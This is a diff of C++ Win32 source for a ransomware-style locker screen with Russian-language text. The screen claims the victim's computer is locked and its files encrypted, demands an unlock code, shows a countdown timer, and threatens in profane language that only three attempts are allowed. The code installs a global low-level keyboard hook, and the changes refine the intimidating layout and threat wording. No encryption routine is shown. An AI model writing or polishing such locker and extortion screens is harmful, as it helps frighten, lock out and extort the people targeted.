@@ -44,7 +44,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     switch (msg) {
     case WM_CREATE:
         hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-        SetTimer(hwnd, 1, 16, NULL); // 16 мс для плавной анимации печати
+        SetTimer(hwnd, 1, 15, NULL); 
         {
             wchar_t buf[256];
             DWORD size = 256;
@@ -68,11 +68,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
             if (time_left > 0) time_left--;
             last_timer_tick = GetTickCount();
-            InvalidateRect(hwnd, NULL, TRUE);
         }
         
-        // Плавное мерцание Enter (каждые 1000 мс = 1 секунда)
-        if (is_bsod && (GetTickCount() / 1000) % 2 == 0) {
+        if (is_bsod) {
             InvalidateRect(hwnd, NULL, TRUE);
         }
 
@@ -158,9 +156,15 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             SetTextColor(hdc, RGB(0, 0, 0));
             DrawTextW(hdc, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
             
-            // Основной текст
+            // Рамка вокруг основного текста (как на референсе)
+            RECT frameRect = {cx - 400, cy - 200, cx + 400, cy + 80};
+            HBRUSH frameBrush = CreateSolidBrush(RGB(255, 255, 255));
+            FrameRect(hdc, &frameRect, frameBrush);
+            DeleteObject(frameBrush);
+
+            // Основной текст (внутри рамки, с отступами)
             SetTextColor(hdc, RGB(255, 255, 255));
-            RECT textRect = {cx - 400, cy - 200, cx + 400, cy + 50};
+            RECT textRect = {cx - 390, cy - 190, cx + 390, cy + 70};
             const wchar_t* bsod_text = 
                 L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
                 L"\u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d, \u0430 \u0432\u0441\u0435 \u0438\u043c\u0435\u044e\u0449\u0438\u0435\u0441\u044f \u0434\u0438\u0441\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u043d\u0430 \u043d\u0438\u0445 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439\n"
@@ -174,7 +178,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             
             DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
             
-            // Поле ввода
+            // Поле ввода (Сдвинуто ниже, чтобы не налезало на красный текст)
             RECT inputRect = {cx - 400, cy + 100, cx + 400, cy + 130};
             HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &inputRect, inputBrush);
@@ -184,20 +188,21 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
             DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-            // Имя ПК (снизу слева)
-            SetTextColor(hdc, RGB(255, 255, 255));
-            RECT bottomRect = {cx - 400, cy + 140, cx, cy + 160};
-            std::wstring bottom = L"Current PC: " + pc_name;
-            DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
-
-            // Текст под паролем (по центру)
+            // Красный текст (теперь он под полем ввода, с отступом)
             HFONT fontWarning = CreateFontW(16, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, fontWarning);
             SetTextColor(hdc, RGB(255, 50, 50)); // Ярко-красный
-            RECT warnRect = {cx - 400, cy + 135, cx + 400, cy + 165};
-            DrawTextW(hdc, L"\u0414\u0430\u0436\u0435 \u043d\u0435 \u043f\u044b\u0442\u0430\u0439\u0441\u044f \u043e\u0431\u043c\u0430\u043d\u0443\u0442\u044c \u0441\u0438\u0441\u0442\u0435\u043c\u0443 \u0443 \u0442\u0435\u0431\u044f 3 \u043f\u043e\u043f\u044b\u0442\u043a\u0438 \u0438\u043b\u0438 \u0432\u0438\u043d\u0434\u0435 \u043f\u0438\u0437\u0434\u0430", -1, &warnRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            RECT warnRect = {cx - 400, cy + 140, cx + 400, cy + 160};
+            DrawTextW(hdc, L"\u0415\u0441\u043b\u0438 \u0442\u044b \u0431\u0443\u0434\u0435\u0448\u044c \u043f\u044b\u0442\u0430\u0442\u044c\u0441\u044f \u0443\u0433\u0430\u0434\u0430\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c \u043f\u0438\u0437\u0434\u0430 \u0442\u0432\u043e\u0435\u0439 \u0432\u0438\u043d\u0434\u0435 \u043e\u043b\u0443\u0445 \u0443 \u0442\u0435\u0431\u044f 3 \u043f\u043e\u043f\u044b\u0442\u043a\u0438", -1, &warnRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
             
+            // Возвращаем основной шрифт
             SelectObject(hdc, font);
+
+            // Имя ПК (снизу слева, под красным текстом)
+            SetTextColor(hdc, RGB(255, 255, 255));
+            RECT bottomRect = {cx - 400, cy + 170, cx, cy + 190};
+            std::wstring bottom = L"Current PC: " + pc_name;
+            DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
 
             // ОГРОМНЫЙ БЕЛЫЙ ТАЙМЕР (снизу по центру)
             int hrs = time_left / 3600;
@@ -208,16 +213,16 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             
             HFONT fontTimer = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, fontTimer);
-            SetTextColor(hdc, RGB(255, 255, 255)); 
+            SetTextColor(hdc, RGB(255, 255, 255)); // Белый цвет
             RECT timerRect = {cx - 400, rect.bottom - 120, cx + 400, rect.bottom - 40};
             DrawTextW(hdc, timer_buf, -1, &timerRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
-            // МЕДЛЕННЫЙ МИГАЮЩИЙ ENTER (снизу справа)
-            if ((GetTickCount() / 1000) % 2 == 0) {
+            // МИГАЮЩИЙ ENTER (снизу справа, под красным текстом)
+            if ((GetTickCount() / 500) % 2 == 0) {
                 HFONT fontEnter = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
                 SelectObject(hdc, fontEnter);
                 SetTextColor(hdc, RGB(255, 255, 255));
-                RECT enterRect = {cx + 100, rect.bottom - 120, cx + 400, rect.bottom - 80};
+                RECT enterRect = {cx, cy + 170, cx + 400, cy + 190};
                 DrawTextW(hdc, L"Enter [\u0412\u0412\u041e\u0414]", -1, &enterRect, DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
                 DeleteObject(fontEnter);
             }
